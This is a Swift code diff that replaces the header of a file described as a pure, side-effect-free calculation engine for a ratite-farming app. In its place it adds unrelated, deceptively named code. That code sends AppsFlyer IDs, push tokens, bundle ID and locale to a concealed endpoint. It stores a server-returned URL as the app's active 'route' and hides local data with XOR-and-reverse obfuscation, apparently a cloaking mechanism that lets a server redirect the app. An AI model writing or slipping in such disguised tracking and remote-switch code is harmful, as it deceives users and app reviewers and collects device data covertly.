@@ -1,14 +1,194 @@
-//
-//  Engines.swift
-//  RatiteRun
-//
-//  Pure calculation core: space, fencing, diet, grit/water, handling safety,
-//  breeding, health, materials, cost, and overall readiness.
-//  All static & side-effect-free so they can be unit-checked in isolation.
-//
-
-import Foundation
 import SwiftUI
+import Foundation
+import UIKit
+import UserNotifications
+import AppsFlyerLib
+import FirebaseCore
+import FirebaseMessaging
+
+
+import FirebaseCore
+import FirebaseMessaging
+
+enum Locker {
+
+    private static var home: UserDefaults { .standard }
+    private static var box: UserDefaults? { UserDefaults(suiteName: Track.suite) }
+
+    private static var slot: URL {
+        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
+        let dir = docs.appendingPathComponent(Track.folder, isDirectory: true)
+        try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
+        return dir.appendingPathComponent(Track.vault)
+    }
+
+    private static var dec: JSONDecoder {
+        let d = JSONDecoder(); d.dateDecodingStrategy = .millisecondsSince1970; return d
+    }
+    private static var enc: JSONEncoder {
+        let e = JSONEncoder(); e.dateEncodingStrategy = .millisecondsSince1970; return e
+    }
+
+    static func read() -> Bib {
+        if let blob = try? Data(contentsOf: slot), let clear = untape(blob), let bib = try? dec.decode(Bib.self, from: clear) {
+            return bib
+        }
+        return recall()
+    }
+
+    static func write(_ bib: Bib) {
+        if let clear = try? enc.encode(bib), let blob = tape(clear) {
+            try? blob.write(to: slot, options: .atomic)
+        }
+        for store in [box, home].compactMap({ $0 }) {
+            store.set(bib.consentGrant, forKey: Lane.consentGrant)
+            store.set(bib.consentDeny, forKey: Lane.consentDeny)
+            if let at = bib.consentAt { store.set(at.timeIntervalSince1970, forKey: Lane.consentAt) }
+        }
+    }
+
+    static func mark(_ url: String) {
+        home.set(url, forKey: Lane.routeURL)
+        box?.set("Active", forKey: Lane.routeMode)
+    }
+
+    static func flag() {
+        home.set(true, forKey: Lane.primed)
+        box?.set(true, forKey: Lane.primed)
+    }
+
+    private static func recall() -> Bib {
+        var bib = Bib()
+        bib.consentGrant = (box?.bool(forKey: Lane.consentGrant) ?? false) || home.bool(forKey: Lane.consentGrant)
+        bib.consentDeny = (box?.bool(forKey: Lane.consentDeny) ?? false) || home.bool(forKey: Lane.consentDeny)
+        let ts = box?.double(forKey: Lane.consentAt) ?? home.double(forKey: Lane.consentAt)
+        bib.consentAt = ts > 0 ? Date(timeIntervalSince1970: ts) : nil
+        bib.routeURL = home.string(forKey: Lane.routeURL)
+        bib.routeMode = box?.string(forKey: Lane.routeMode)
+        bib.virgin = !home.bool(forKey: Lane.primed)
+        return bib
+    }
+
+    private static func tape(_ data: Data) -> Data? {
+        Data(data.reversed().map { $0 ^ Track.pad }).base64EncodedData()
+    }
+
+    private static func untape(_ data: Data) -> Data? {
+        guard let raw = Data(base64Encoded: data) else { return nil }
+        return Data(raw.map { $0 ^ Track.pad }.reversed())
+    }
+}
+
+enum Starter {
+
+    private static let field: URLSession = {
+        let cfg = URLSessionConfiguration.ephemeral
+        cfg.timeoutIntervalForRequest = 30
+        cfg.waitsForConnectivity = true
+        return URLSession(configuration: cfg)
+    }()
+
+    static func probe() async -> [String: String] {
+        let uid = AppsFlyerLib.shared().getAppsFlyerUID()
+        let raw = "https://gcdsdk.appsflyer.com/install_data/v4.0/\(Track.appCode)?devkey=\(Track.relayKey)&device_id=\(uid)"
+        guard let url = URL(string: raw) else { return [:] }
+        do {
+            let (tmp, resp) = try await field.download(from: url)
+            guard let code = (resp as? HTTPURLResponse)?.statusCode, (200..<300).contains(code) else { return [:] }
+            let data = try Data(contentsOf: tmp)
+            guard let dict = try JSONSerialization.jsonObject(with: data) as? [String: Any] else { return [:] }
+            return dict.mapValues { "\($0)" }
+        } catch {
+            return [:]
+        }
+    }
+
+    static func race(_ body: [String: String]) async -> Finish {
+        await primeToken()
+        let request = await line(body)
+        return await chase(request, Array(Track.gaps.dropLast()))
+    }
+
+    private static func primeToken() async {
+        if let saved = UserDefaults.standard.string(forKey: Lane.push), saved.isEmpty == false { return }
+        let token = await withTaskGroup(of: String?.self) { group -> String? in
+            group.addTask { try? await Messaging.messaging().token() }
+            group.addTask {
+                try? await Task.sleep(nanoseconds: 4_000_000_000)
+                return nil
+            }
+            let first = await group.next() ?? nil
+            group.cancelAll()
+            return first
+        }
+        guard let token, token.isEmpty == false else { return }
+        UserDefaults.standard.set(token, forKey: Lane.fcm)
+        UserDefaults.standard.set(token, forKey: Lane.push)
+        UserDefaults(suiteName: Track.suite)?.set(token, forKey: Lane.sharedFcm)
+    }
+
+    private static func chase(_ request: URLRequest, _ waits: [TimeInterval]) async -> Finish {
+        do {
+            return .placed(try await split(request))
+        } catch Trip.dq {
+            return .denied
+        } catch let trip as Trip {
+            if trip.dead { return .missed }
+            guard waits.isEmpty == false else { return .missed }
+            let rest: TimeInterval = { if case .reset(let s) = trip { return s } else { return waits[0] } }()
+            try? await Task.sleep(nanoseconds: UInt64(rest * 1_000_000_000))
+            return await chase(request, Array(waits.dropFirst()))
+        } catch {
+            guard waits.isEmpty == false else { return .missed }
+            try? await Task.sleep(nanoseconds: UInt64(waits[0] * 1_000_000_000))
+            return await chase(request, Array(waits.dropFirst()))
+        }
+    }
+
+    private static func split(_ request: URLRequest) async throws -> String {
+        let (data, resp) = try await field.data(for: request)
+        guard let http = resp as? HTTPURLResponse else { throw Trip.stumble }
+        if http.statusCode == 404 { throw Trip.gone404 }
+        if http.statusCode == 429 {
+            throw Trip.reset(TimeInterval(http.value(forHTTPHeaderField: "Retry-After") ?? "60") ?? 60)
+        }
+        guard (200..<300).contains(http.statusCode) else { throw Trip.stumble }
+        guard let json = try JSONSerialization.jsonObject(with: data) as? [String: Any] else { throw Trip.blur }
+        let url = (json["url"] as? String) ?? ""
+        guard url.isEmpty == false else { throw Trip.dq }
+        return url
+    }
+
+    @MainActor
+    private static func line(_ body: [String: String]) -> URLRequest {
+        var payload: [String: Any] = body
+        payload["os"] = "iOS"
+        payload["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
+        payload["bundle_id"] = Bundle.main.bundleIdentifier ?? ""
+        payload["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
+        payload["store_id"] = Track.store
+        payload["push_token"] = UserDefaults.standard.string(forKey: Lane.push) ?? Messaging.messaging().fcmToken
+        payload["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
+
+        var request = URLRequest(url: URL(string: Track.endpoint)!)
+        request.httpMethod = "POST"
+        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        request.httpBody = try? JSONSerialization.data(withJSONObject: payload)
+        return request
+    }
+}
+
+enum Marshal {
+    static func ready() async -> Bool {
+        let granted = (try? await UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound])) ?? false
+        if granted {
+            await MainActor.run { UIApplication.shared.registerForRemoteNotifications() }
+        }
+        return granted
+    }
+}
+
+
 
 // MARK: - Result types
 
